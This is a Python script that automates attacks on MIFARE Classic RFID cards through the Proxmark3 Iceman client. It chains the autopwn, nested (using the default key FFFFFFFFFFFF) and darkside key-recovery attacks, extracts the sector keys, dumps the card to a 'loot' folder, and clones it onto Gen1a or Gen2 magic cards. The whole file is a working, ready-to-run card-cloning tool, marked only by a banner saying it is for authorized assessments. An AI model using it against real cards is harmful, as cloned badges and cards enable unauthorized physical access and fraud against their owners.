#!/usr/bin/env python3
# ==============================================================================
#  mifare.py
#  Description : MIFARE Classic key attack automation via Proxmark3 Iceman
#                firmware. Runs autopwn, nested attack, and darkside attack
#                in sequence. Dumps card contents and clones to magic card.
#  Requires    : pm3 (Proxmark3 Iceman firmware client) in PATH
#  Usage       : python3 mifare.py [--port /dev/ttyACM0]
# ==============================================================================

import subprocess
import argparse
import json
import sys
import os
import re
from datetime import datetime

LOOT_DIR = "./loot/mifare"
os.makedirs(LOOT_DIR, exist_ok=True)


def run_pm3(command: str, port: str = "", timeout: int = 120) -> str:
    """Run a pm3 -c command and return combined stdout+stderr."""
    cmd = ["pm3"]
    if port:
        cmd += ["-p", port]
    cmd += ["-c", command]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[!] pm3 command timed out"
    except FileNotFoundError:
        print("[!] pm3 not found. Install Proxmark3 Iceman firmware and ensure pm3 is in PATH.")
        sys.exit(1)


def timestamp_prefix() -> str:
    return datetime.utcnow().strftime("%Y%m%d_%H%M%S")


def autopwn(port: str = "") -> dict:
    """
    Run hf mf autopwn — full automated MIFARE Classic attack.
    Attempts nested + hardnested + dictionary attacks automatically.
    """
    print("[*] Running hf mf autopwn (full automated attack)...")
    print("[*] This may take several minutes depending on card type...")
    output = run_pm3("hf mf autopwn", port, timeout=300)
    print(output)

    result = {
        "method": "autopwn",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "success": False,
        "keys": {},
        "dump_file": None,
        "raw_output": output,
    }

    if "autopwn" in output.lower() and ("[+]" in output or "found" in output.lower()):
        result["success"] = True

    key_pattern = re.findall(r"Sector\s+(\d+)[^\n]*[Kk]ey[AB][^\n]*:\s*([0-9A-Fa-f]{12})", output)
    for sector, key in key_pattern:
        if sector not in result["keys"]:
            result["keys"][sector] = []
        result["keys"][sector].append(key.upper())

    dump_match = re.search(r"Saved to[^\n]*?([^\s]+\.bin)", output)
    if dump_match:
        result["dump_file"] = dump_match.group(1)

    return result


def nested_attack(port: str = "") -> dict:
    """Run hf mf nested attack (requires at least one known sector key)."""
    print("[*] Running hf mf nested attack...")
    print("[!] Nested attack requires at least one known key (default: FFFFFFFFFFFF for sector 0 KeyA)")
    output = run_pm3("hf mf nested --blk 0 -a -k FFFFFFFFFFFF --dump", port, timeout=300)
    print(output)

    result = {
        "method": "nested",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "success": False,
        "keys": {},
        "raw_output": output,
    }

    if "[+]" in output and "key" in output.lower():
        result["success"] = True

    key_pattern = re.findall(r"(?:sec|sector)\s*(\d+)[^\n]*key[^\n]*:\s*([0-9A-Fa-f]{12})", output, re.IGNORECASE)
    for sector, key in key_pattern:
        if sector not in result["keys"]:
            result["keys"][sector] = []
        result["keys"][sector].append(key.upper())

    return result


def darkside_attack(port: str = "") -> dict:
    """Run hf mf darkside attack (works on cards with factory default crypto1 weakness)."""
    print("[*] Running hf mf darkside attack...")
    print("[*] Darkside attack targets cards with CRYPTO1 PRNG weakness...")
    output = run_pm3("hf mf darkside", port, timeout=300)
    print(output)

    result = {
        "method": "darkside",
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "success": False,
        "key": None,
        "raw_output": output,
    }

    key_match = re.search(r"[Ff]ound[^\n]*key[^\n]*:\s*([0-9A-Fa-f]{12})", output)
    if key_match:
        result["success"] = True
        result["key"] = key_match.group(1).upper()
        print(f"[+] Darkside key found: {result['key']}")

    return result


def dump_card(port: str = "") -> str:
    """Dump full MIFARE Classic card to binary file."""
    ts = timestamp_prefix()
    dump_path = os.path.join(LOOT_DIR, f"mf_dump_{ts}")
    print(f"[*] Dumping card to {dump_path}.bin...")
    output = run_pm3(f"hf mf dump --file {dump_path}", port, timeout=120)
    print(output)

    if os.path.exists(f"{dump_path}.bin"):
        print(f"[+] Dump saved: {dump_path}.bin")
        return f"{dump_path}.bin"
    else:
        print("[!] Dump file not found at expected path. Check output above.")
        return None


def clone_to_magic_gen1a(dump_file: str, port: str = "") -> None:
    """Clone dumped card to Magic Card Gen1a (UID changeable)."""
    print(f"[*] Cloning dump to Magic Card Gen1a from: {dump_file}")
    print("[!] Ensure a blank Magic Card Gen1a is on the reader.")
    output = run_pm3(f"hf mf cload --file {dump_file}", port, timeout=120)
    print(output)
    if "[+]" in output or "success" in output.lower():
        print("[+] Clone to Gen1a SUCCESS")
    else:
        print("[!] Clone may have failed. Check output above.")


def clone_to_magic_gen2(dump_file: str, port: str = "") -> None:
    """Clone dumped card to Magic Card Gen2 (CUID)."""
    print(f"[*] Cloning dump to Magic Card Gen2 from: {dump_file}")
    print("[!] Ensure a blank Magic Card Gen2 is on the reader.")
    output = run_pm3(f"hf mf cload --gen2 --file {dump_file}", port, timeout=120)
    print(output)
    if "[+]" in output or "success" in output.lower():
        print("[+] Clone to Gen2 SUCCESS")
    else:
        print("[!] Clone may have failed. Check output above.")


def save_results(results: list) -> str:
    ts = timestamp_prefix()
    out_path = os.path.join(LOOT_DIR, f"mifare_results_{ts}.json")
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[+] Results saved to: {out_path}")
    return out_path


def full_attack_sequence(port: str = "") -> list:
    """
    Run the full attack sequence:
    1. autopwn
    2. If autopwn fails, try nested
    3. If nested fails, try darkside
    4. Dump card contents
    """
    print("\n[*] Starting full MIFARE Classic attack sequence...")
    results = []

    # Step 1: autopwn
    autopwn_result = autopwn(port)
    results.append(autopwn_result)
    save_results(results)

    if autopwn_result["success"]:
        print("[+] autopwn succeeded.")
        dump_file = dump_card(port)
        if dump_file:
            results.append({"method": "dump", "file": dump_file})
    else:
        print("[!] autopwn did not fully succeed. Trying nested attack...")

        # Step 2: nested
        nested_result = nested_attack(port)
        results.append(nested_result)
        save_results(results)

        if nested_result["success"]:
            print("[+] Nested attack succeeded.")
            dump_file = dump_card(port)
            if dump_file:
                results.append({"method": "dump", "file": dump_file})
        else:
            print("[!] Nested attack failed. Trying darkside attack...")

            # Step 3: darkside
            darkside_result = darkside_attack(port)
            results.append(darkside_result)
            save_results(results)

            if darkside_result["success"]:
                print("[+] Darkside attack succeeded. Re-running autopwn with discovered key...")
                autopwn_result2 = autopwn(port)
                results.append(autopwn_result2)
                dump_file = dump_card(port)
                if dump_file:
                    results.append({"method": "dump", "file": dump_file})
            else:
                print("[!] All attacks failed. Card may use hardened crypto or non-standard sector layout.")

    save_results(results)
    return results


def print_banner():
    print("=" * 60)
    print("  MIFARE Classic Attack Tool — Proxmark3 Iceman")
    print("  For authorized security assessments only")
    print("=" * 60)
    print()


def menu(port: str = ""):
    print_banner()
    last_dump = None

    while True:
        print("\n[MENU]")
        print("  1. Full attack sequence (autopwn → nested → darkside)")
        print("  2. Run autopwn only (hf mf autopwn)")
        print("  3. Run nested attack only (hf mf nested)")
        print("  4. Run darkside attack only (hf mf darkside)")
        print("  5. Dump card to file (hf mf dump)")
        print("  6. Clone dump to Magic Card Gen1a")
        print("  7. Clone dump to Magic Card Gen2 (CUID)")
        print("  0. Exit")
        print()
        choice = input("Select option: ").strip()

        if choice == "1":
            results = full_attack_sequence(port)
            for r in results:
                if r.get("method") == "dump" and r.get("file"):
                    last_dump = r["file"]

        elif choice == "2":
            result = autopwn(port)
            save_results([result])
            if result.get("keys"):
                print(f"\n[+] Recovered keys: {json.dumps(result['keys'], indent=2)}")

        elif choice == "3":
            result = nested_attack(port)
            save_results([result])
            if result.get("keys"):
                print(f"\n[+] Recovered keys: {json.dumps(result['keys'], indent=2)}")

        elif choice == "4":
            result = darkside_attack(port)
            save_results([result])

        elif choice == "5":
            last_dump = dump_card(port)

        elif choice == "6":
            if last_dump:
                clone_to_magic_gen1a(last_dump, port)
            else:
                dump_path = input("  Enter path to .bin dump file: ").strip()
                clone_to_magic_gen1a(dump_path, port)

        elif choice == "7":
            if last_dump:
                clone_to_magic_gen2(last_dump, port)
            else:
                dump_path = input("  Enter path to .bin dump file: ").strip()
                clone_to_magic_gen2(dump_path, port)

        elif choice == "0":
            print("[*] Exiting.")
            break
        else:
            print("[!] Invalid choice.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MIFARE Classic attack automation via Proxmark3")
    parser.add_argument("--port", "-p", default="", help="Proxmark3 serial port (e.g. /dev/ttyACM0)")
    args = parser.parse_args()
    menu(args.port)
